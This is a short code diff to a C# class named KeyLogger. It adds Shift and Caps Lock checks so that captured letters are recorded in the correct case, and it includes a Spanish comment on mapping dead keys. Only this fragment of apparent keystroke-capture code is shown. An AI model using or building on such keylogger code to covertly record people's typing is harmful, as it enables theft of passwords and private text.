@@ -85,9 +85,20 @@ class KeyLogger
 
             if (result > 0 && !string.IsNullOrWhiteSpace(raw))
             {
+                // Si es dead key o símbolo de control → mapear manualmente
                 if (char.IsControl(raw[0]) || (int)raw[0] == 0xFFFF)
                 {
                     key = MapKnownKey(vkCode);
+                }
+                else if (char.IsLetter(raw[0]))
+                {
+                    bool shift = (GetKeyState(VK_SHIFT) & 0x8000) != 0;
+                    bool caps = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
+
+                    if (!shift && !caps && char.IsUpper(raw[0]))
+                        key = raw.ToLower();
+                    else
+                        key = raw;
                 }
                 else
                 {
